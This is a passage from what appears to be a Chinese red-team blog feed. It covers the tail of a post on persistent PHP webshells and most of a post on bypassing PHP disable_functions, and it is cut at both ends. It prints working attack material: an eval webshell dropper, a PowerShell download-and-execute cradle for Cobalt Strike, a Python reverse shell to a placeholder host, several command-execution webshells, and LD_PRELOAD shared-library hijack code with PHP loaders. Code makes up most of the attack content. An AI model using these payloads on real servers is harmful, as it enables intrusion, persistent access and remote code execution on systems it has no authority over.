punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$interval</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>判断是否存在，不存在就会一直生成一个test.php的文件，当然这个php文件是没有实现无文件落地，如果需要实现还需要添加代码</p><pre><code>@unlink(__FILE__)</code></pre><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>首先我放在了我的www目录里面，去访问一下</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211013181718869.png" alt="image-20211013181718869"></p><p>本地已经生成了test.php，当我们删除这个test.php，然后等待5秒，就有会在当前目录生成一个test.php文件</p><h2 id="蚁剑插件尝试"><a href="#蚁剑插件尝试" class="headerlink" title="蚁剑插件尝试"></a>蚁剑插件尝试</h2><p>蚁剑的插件市场就有php的不死马，尝试利用</p><p>1.首先在获得webshell</p><p>2.打开插件的不死马</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211013214808955.png" alt="image-20211013214808955"></p><p>3.前提在当前文件下创建一个xx.txt文件</p><p>文件内容：file_put_contents(‘./1.php’,’<!--?php @eval($_POST[ash]); ?-->‘);    当然可以换别的命令。</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211013221154686.png" alt="image-20211013221154686"></p><p>4.输入</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211013223040392.png" alt="image-20211013223040392"></p><p>输入<a href="http://xx.xx.xx.xx/1.txt###5" target="_blank" rel="noopener">http://xx.xx.xx.xx/1.txt###5</a>    具体内容就是  1.txt是我刚才创建的，5就是多少时间执行一次</p><p>5.确定完了之后就可以看到生成了</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211013223304924.png" alt="image-20211013223304924"></p><p>看到使用cs上线了，这尝试一下如何使用cs去上线。之前没有做过利用php去上线，碰到一点小问题，还好摸索解决了</p><p>正常来讲，这是cs上线的powershell的方式</p><pre class="line-numbers language-powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>c <span class="token string">"IEX ((new-object net.webclient).downloadstring('http://xx.xx.x.xx:80/b'))"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再来看看php当中单引号，双引号，反斜杠\的概念</p><p>双引号是可以解析里面的变量，而单引号是不能解析的，\就是转义：去除PHP赋予某些字符的特殊含义</p><p>在很多代码里面都会对里面的内容进行单引号或者双引号的包裹，但是单引号双引号一多就容易犯糊涂。</p><pre><code>echo 'i'm ok';  //比如这段代码</code></pre><p>正常来讲，我们是想输出i’m ok  但是如果不加反斜杠 那么代码就变成</p><pre><code>'i'm ok'  前面一个单引号就跟m前面的单引号闭合了，那么就会造成报错那么就需要加一个反斜杠'i\'m ok'  那么出来就是i'm ok</code></pre><p>同理如果在变量面前加\ 那么这个变量也不会解析的</p><pre><code>$a = 5echo "\$a=".$a 结果就是$a=5  </code></pre><p>再回来看看我们的powershell代码也是一样的效果</p><pre><code>system('powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://xx.xx.x.xx:80/b'))"')</code></pre><p>像上面的这个代码就会报错，因为双引号里面还有单引号，而这个单引号是我们想要放在里面的，那么就需要转义添加个\就行了</p><pre><code>system('powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://xx.xx.x.xx:80/b\'))"')</code></pre><h3 id="cs上线"><a href="#cs上线" class="headerlink" title="cs上线"></a>cs上线</h3><p>那么同理，利用蚁剑的插件就可以不停的上线cs了，但是实战当中这样利用肯定不行，流量太多，一下子就发现了。</p><p>1.txt的内容</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014153917216.png" alt="image-20211014153917216"></p><p>生成的1.php的内容</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014153949659.png" alt="image-20211014153949659"></p><p>最后访问1.php上线成功</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014153841664.png" alt="image-20211014153841664"></p><p>现实当中如果遇到这种，建议直接重启，kill进程，条件竞争这不太实用</p><p>总的来说就是：我们通过ash传递参数只要传递的md5值跟后面的一样就会把一句话木马写入我们的文件，通过不断生成文件在当前目录下，形成了不死马，不死马是一个进程，所以往往要重启主机或重启服务才能kill掉。</p><p>参考链接：</p><p><a href="https://mp.weixin.qq.com/s/U-OtSm-bSO-IiF1eKuSmfg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/U-OtSm-bSO-IiF1eKuSmfg</a></p><p><a href="https://www.dazhuanlan.com/poypure/topics/1122369" target="_blank" rel="noopener">https://www.dazhuanlan.com/poypure/topics/1122369</a></p><p><a href="http://vfree.ltd/index.php/archives/76/" target="_blank" rel="noopener">http://vfree.ltd/index.php/archives/76/</a></p><p><a href="https://copyfuture.com/blogs-details/20200817113644488r5wnmrdmqse0kmt" target="_blank" rel="noopener">https://copyfuture.com/blogs-details/20200817113644488r5wnmrdmqse0kmt</a></p>]]></content>
      
      
      <categories>
          
          <category> 红队技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过disable_functions</title>
      <link href="/posts/c927.html"/>
      <url>/posts/c927.html</url>
      
        <content type="html"><![CDATA[<h1 id="Bypass-disable-functions的方法"><a href="#Bypass-disable-functions的方法" class="headerlink" title="Bypass disable_functions的方法"></a>Bypass disable_functions的方法</h1><h3 id="前提背景"><a href="#前提背景" class="headerlink" title="#前提背景"></a>#前提背景</h3><p>什么是disable_functions:是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。</p><p>打开我phpstudy启动的服务，因为我没有设置过php.ini，所以我的disable_functions是空的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003110917282.png" alt="image-20211003110917282"></p><p>再来看看什么是php.ini：最直接影响PHP 功能的配置文件   。那么自然而言我们就可以在php.ini里面设置禁用一些函数来看看</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003111416409.png" alt="image-20211003111416409"></p><p>注意：eval并非PHP函数，放在disable_functions中是无法禁用的，若要禁用需要用到PHP的扩展Suhosin。详细的eval与assert这个我会在命令执行里面提到</p><p>禁用这4个来看看phpinfo里面的效果(别忘了重启服务)</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003111755116.png" alt="image-20211003111755116"></p><p>可以看到，但是当我们上传webshell的时候，却因为disable_functions而无法执行里面的命令，那么我们就需要去绕过</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003114008625.png" alt="image-20211003114008625"></p><p>直接就上传不了，当然</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006193257373.png" alt="image-20211006193257373"></p><p>出现ret=127也是函数被禁用的原因了</p><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><p>黑名单顾名思义就是找到不在它禁用的范围里面</p><p>函数有很多</p><pre><code>system,assert,passthru,exec,pcntl_exec,shell_exec,popen,proc_open...等等</code></pre><p>详细的可以看我写的命令执行和代码执行的一些函数</p><p>比如system</p><pre><code>    &lt;?php    highlight_file(__FILE__);    system('dir');    system('whoami');    ?&gt;</code></pre><p>被禁用后</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003115633534.png" alt="image-20211003115633534"></p><h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h4><p>利用条件:需要开启pcntl扩展(可以在phpinfo上面搜索pcntl，如果有单独的说明开了这个模块)</p><p>安装扩展的方法：<a href="https://www.zixuephp.net/article-429.html" target="_blank" rel="noopener">https://www.zixuephp.net/article-429.html</a></p><p>pcntl_exec()是pcntl（linux下面的一个扩展）插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。</p><p>存在扩展的情况</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003175633489.png" alt="image-20211003175633489"></p><pre><code>#exec.php&lt;?php pcntl_exec(“/bin/bash”, array(“/tmp/123.sh”));?&gt;#/tmp/123.sh#!/bin/bashls -l /</code></pre><p>这个pcntl_exec就去执行/tmp目录下的123.sh</p><p>但是pcntl_exec是没有回显的，我们就可以利用它去执行反弹shell</p><pre><code>&lt;?php pcntl_exec("/usr/bin/python3",array('-c','import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("x.x.x.x",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'));</code></pre><p><a href="https://whoamianony.top/2020/12/21/CTF比赛记录/第四届“蓝帽杯”全国大学生网络安全技能大赛决赛WriteUp/#php" target="_blank" rel="noopener">[第四届“蓝帽杯”决赛]php</a> 这道题利用的就是这个点</p><h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><pre><code>    &lt;?php    highlight_file(__FILE__);    $command = $_GET['cmd']    passthru($command); //直接输出结果    ?&gt;</code></pre><h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><pre><code>&lt;?phphighlight_file(__FILE__);$command=$_GET['command'];$fd = popen($command, 'r'); while($s=fgets($fd)){    print_r($s);}?&gt;</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003194559929.png" alt="image-20211003194559929"></p><h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h4><pre><code>&lt;?php    highlight_file(__FILE__);    $command=$_GET['command'];    $descriptorspec=array(         0=&gt;array('pipe','r'),         1=&gt;array('pipe','w'),        2=&gt;array('pipe','w')     );    $handle=proc_open($command,$descriptorspec,$pipes,NULL);    if(!is_resource($handle)){        die('proc_open failed');    }    while($s=fgets($pipes[1])){        print_r($s);    }    while($s=fgets($pipes[2])){        print_r($s);    }    fclose($pipes[0]);    fclose($pipes[1]);    fclose($pipes[2]);    proc_close($handle);?&gt;</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003194806934.png" alt="image-20211003194806934"></p><h4 id="com组件"><a href="#com组件" class="headerlink" title="com组件"></a>com组件</h4><p>这个需要添加扩展才行（PHP&gt;5.4），找到php.ini文件，添加extension=php_com_dotnet.dll，php_com_dotnet 只在 window 系统中有效</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003224707326.png" alt="image-20211003224707326"></p><p>phpstudy里面也可以添加</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003200306260.png" alt="image-20211003200306260"></p><p>打开phpinfo</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003225300468.png" alt="image-20211003225300468"></p><p>enable之后，就可以使用如下脚本了</p><p>ps:在这卡了2个多小时，之前phpstudy2017问题，没有指定dll文件，安装后也不行一直报错，后来换了小皮的phpstudy发现也不行，一直磨啊磨，后来才发现是单词拼错了，太菜了……</p><pre><code>&lt;?phphighlight_file(__FILE__);$command=$_GET['cmd'];$wsh = new COM('WScript.shell'); //// 生成一个COM对象　Shell.Application也能$exec = $wsh-&gt;exec("cmd /c ".$command); //调用对象方法来执行命令$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput;?&gt;</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003225637972.png" alt="image-20211003225637972"></p><p>总结：disable_funtions总有限制不全的时候，多观察哪些没有被限制，从而去利用</p><h3 id="利用Linux环境变量LD-PRELOAD"><a href="#利用Linux环境变量LD-PRELOAD" class="headerlink" title="利用Linux环境变量LD_PRELOAD"></a>利用Linux环境变量LD_PRELOAD</h3><p>原理：</p><p><code>**LD_PRELOAD**</code> 是 Linux 系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它可以在用户的程序运行前优先加载该动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，可以利用此功能来使用自定义的函数，而另一方面，可以向别人的程序注入程序，从而达到特定的攻击目的</p><p>总的来说：这个函数指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果，并且劫持系统函数，从而达到不调用php命令执行函数，仍然可以执行系统命令。</p><p>在Linux中，动态链接库的后缀名通常用.so 表示；在Windows系统中，动态链接库的后缀名为.dll</p><p>前提条件：</p><ul><li>需要能上传.so的文件 (so文件就是常说的动态链接库)</li><li>能够控制环境变量的值（设置LD_PRELOAD变量），比如putenv，mail函数</li><li>因为新进程启动将加载 <code>LD_PRELOAD</code> 中的 <code>.so</code> 文件，所以要存在可以控制 PHP 启动外部程序的函数并能执行，比如 <code>mail()</code>、<code>imap_mail()</code>、<code>mb_send_mail()</code> 和 <code>error_log()</code> 函数等,也就是说能够调用动态链接库</li></ul><h4 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h4><p>结合例子来理解这个怎么做到劫持：</p><p>在下面的例子之前如果对共享库不理解可以看看这篇</p><p><a href="https://cloud.tencent.com/developer/article/1683012" target="_blank" rel="noopener">Linux共享库、静态库、动态库详解</a></p><p>首先我们自己创建一个生成随机10个数的代码</p><p>random.c </p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们先编译运行一下看看效果</p><pre><code>gcc random.c -o random</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004135639016.png" alt="image-20211004135639016"></p><p>接着再去编一个，只返回66数值  随便去一个random1.c</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token number">66</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时候把他们编译成动态共享库</p><pre><code>gcc -shared -fPIC random1.c  -o random1.so  </code></pre><p><a href="https://blog.csdn.net/itworld123/article/details/117587091?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link" target="_blank" rel="noopener">对于-fPIC的理解</a>  我的简单理解就是实现真正意义上的共享吧</p><pre><code>export LD_PRELOAD="./random1.so"</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004141353031.png" alt="image-20211004141353031"></p><p>再来ldd看看先后顺序</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004141542678.png" alt="image-20211004141542678"></p><p>可以看到程序执行的时候优先执行了我们动态链接库，实现了劫持的功能</p><h4 id="劫持getuid"><a href="#劫持getuid" class="headerlink" title="劫持getuid()"></a>劫持getuid()</h4><p>原理:</p><p>php的mail()函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，而/usr/sbin/sendmail会调用getuid()。那么我们在利用LD_PRELOAD环境变量去劫持getuid(),再用mail()函数来触发sendmail程序进而执行被劫持的getuid()，从而就能执行恶意代码了</p><p>攻击前提：在Linux中已安装并启用sendmail程序。</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004160745506.png" alt="image-20211004160745506"></p><p>攻击过程：<br>1、生成含有恶意代码的动态链接程序。<br>2、运用<code>putenv</code>来设置<code>LD_PRELOAD</code>，优先调用我们编写的程序。<br>3、通过webshell触发函数（mail）</p><p>因为我们用的是getuid的函数，可以查看一下</p><pre><code>readelf -Ws /usr/sbin/sendmail | grep "getuid"</code></pre><p>创建test.c (获取LD_PRELOAD环境变量并预加载恶意的共享库，再删除环境变量 LD_PRELOAD，最后执行由system函数获取的系统命令)</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> cmdline <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当共享库里面的getuid函数被调用了，那么就会去执行system函数</p><p>接着编译一下</p><pre><code>gcc -c -fPIC test.c -o exp&amp;&amp;gcc -shared exp -o exp.so</code></pre><p>把.so文件上传到服务器，并且写一个webshell  </p><p>test.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span></span>example<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//test.com/exp.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/exp.so &lt;/p>";</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$out_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"outpath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$evil_cmdline</span> <span class="token operator">=</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">" > "</span> <span class="token punctuation">.</span> <span class="token variable">$out_path</span> <span class="token punctuation">.</span> <span class="token string">" 2>&amp;1"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>cmdline&lt;/b>: "</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE="</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$so_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"sopath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD="</span> <span class="token punctuation">.</span> <span class="token variable">$so_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>output&lt;/b>: &lt;br />"</span> <span class="token punctuation">.</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>     <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cmd是我们要执行的参数，outpath输出的路径，sopath是我们的动态链接库</p><p>哎。。又磨了一下午没磨出来</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004163842159.png" alt="image-20211004163842159"></p><p>一直显示500.sendmail也安装了，访问路径下别的都行，就是这个php不行,等有空再钻研一下</p><p>但是方法就是那么一个方法，有师傅成功了教教我。</p><p>缺点：因为所学的知识都是用于真实的环境，所以在真实环境中有两点</p><p>1.某些环境中，web 禁止启用 sendmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；</p><p>2.即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1  lamp、lamp.、lamp.com）</p><h4 id="劫持启动进程"><a href="#劫持启动进程" class="headerlink" title="劫持启动进程"></a>劫持启动进程</h4><p>为了不去尝试sendmail这个，GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数，</p><p>bypass_disablefunc.c</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _GNU_SOURCE</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">extern</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> environ<span class="token punctuation">;</span><span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// get command line options and arg</span>    <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> cmdline <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// unset environment variable LD_PRELOAD.</span>    <span class="token comment" spellcheck="true">// unsetenv("LD_PRELOAD") no effect on some </span>    <span class="token comment" spellcheck="true">// distribution (e.g., centos), I need crafty trick.</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> environ<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>environ<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    environ<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// executive command</span>    <span class="token function">system</span><span class="token punctuation">(</span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>bypass_disablefunc.php  这个跟上面的test.php一样</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span></span>example<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p>";</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$out_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"outpath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$evil_cmdline</span> <span class="token operator">=</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">" > "</span> <span class="token punctuation">.</span> <span class="token variable">$out_path</span> <span class="token punctuation">.</span> <span class="token string">" 2>&amp;1"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>cmdline&lt;/b>: "</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE="</span> <span class="token punctuation">.</span> 